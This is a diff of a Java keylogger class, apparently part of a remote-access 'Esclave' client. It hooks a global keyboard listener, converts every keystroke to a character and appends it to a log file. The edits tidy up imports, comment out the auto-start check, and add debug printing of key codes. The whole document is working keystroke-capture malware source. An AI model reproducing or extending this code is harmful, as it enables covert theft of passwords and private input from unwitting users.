@@ -4,17 +4,13 @@ import java.awt.Toolkit;
 import java.awt.event.KeyEvent;
 import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
-import java.nio.file.Path;
 import java.nio.file.Paths;
-import java.util.Timer;
 
 import client.Esclave;
 import de.ksquared.system.keyboard.GlobalKeyListener;
-import de.ksquared.system.keyboard.KeyAdapter;
 import de.ksquared.system.keyboard.KeyListener;
 
 public class Keylogging extends Thread {
@@ -25,7 +21,7 @@ public class Keylogging extends Thread {
 	private static File f;
 	private int code;
 	private static boolean capslock;
-	private static boolean shift, flag;
+	private static boolean shift;
 	private static PrintWriter pw;
 	private int nombredecaractereparligne = 0;
 
@@ -37,25 +33,26 @@ public class Keylogging extends Thread {
 		pw = new PrintWriter(new BufferedWriter(
 				new FileWriter(cheminFile, true)));
 
-		if (f.exists())
+	/**	if (f.exists())
 			this.start();
-
 		else
 			System.out
-		.println("[debug] Ne peux pas ouvrir un fichier pour sauvegarder les frappes");
-	}
+					.println("Ne peux pas ouvrir un fichier pour sauvegarder les frappes");
+	**/}
 
+	@Override
 	public void run() {
 		new GlobalKeyListener().addKeyListener(new KeyListener() {
+
 			@Override
 			public void keyPressed(de.ksquared.system.keyboard.KeyEvent event) {
 				// TODO Auto-generated method stub
-
 				try {
 					code = event.getVirtualKeyCode();
+					System.out.println(code);
+
 					char character = codeToChar(code);
 					pw.print(character);
-					System.out.println(character);
 					pw.flush();
 					if (nombredecaractereparligne++ > 40) {
 						pw.println();
@@ -510,24 +507,22 @@ public class Keylogging extends Thread {
 
 		case 160: {
 			shift = true;
-			flag = false;
 		}
 			break;
 		case 161: {
 			shift = true;
-			flag = false;
 		}
 			break;
 		case 20: {
 			capslock = !capslock;
-			flag = false;
 		}
 			break;
 		}
 		return key;
 	}
 
-	public synchronized void arreteKeylog() {
+	@SuppressWarnings("deprecation")
+	public void arreteKeylog() {
 		this.stop();
 		pw.close();
 	}
